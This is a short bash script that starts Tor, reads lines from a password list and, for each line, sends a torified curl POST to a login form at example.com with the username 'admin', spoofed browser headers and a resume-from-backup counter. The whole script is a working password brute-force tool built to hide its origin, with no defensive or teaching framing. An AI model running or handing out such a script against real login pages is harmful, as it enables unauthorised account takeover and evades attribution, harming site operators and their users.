inicial=10
final=100
file="list.txt"
bak=".bak"

#starts Tor
systemctl start tor

count=$(($final-$inicial+1))
i=$inicial

#checks if backup exists
if [ -f "$bak" ] 
then
        itemp=`cat $bak`
        read -p "Backup file found: $itemp. Continue from backup (Y/n)?" choice
        case "$choice" in 
        y|Y )
                i=$itemp
                echo "Continue from backup...Backup: $i"
                ;;
        n|N ) 
                echo "Starting from scratch"
                ;;
        * )
                i=$itemp
                echo "Continue from backup...Backup: $i"
                ;;
esac
fi


for lol in `sed -n -e "$inicial,$final p" -e "$final q" $file`
do
        echo $lol
        echo  
        ((i++))
        echo "$i of $count"
        echo $i > $bak
#done
#exit

torify curl -s -k -X POST \
    -H "Host: example.com" \
    -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0" \
    -H "Accept: application/json, text/plain, */*" \
    -H "Accept-Language: en-US,en;q=0.5" \
    -H "Accept-Encoding: gzip, deflate" \
    -H "Referer: https://example.com" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -H "Content-Length: 99" \
    -H "Origin: https://example.com" \
    -H "Connection: close" \
    -H "Cookie: cookie=cookie;" \
    --data-binary "user=admin&password=$lol" \
    https://example.com/login

done

#deleting backup
rm .bak
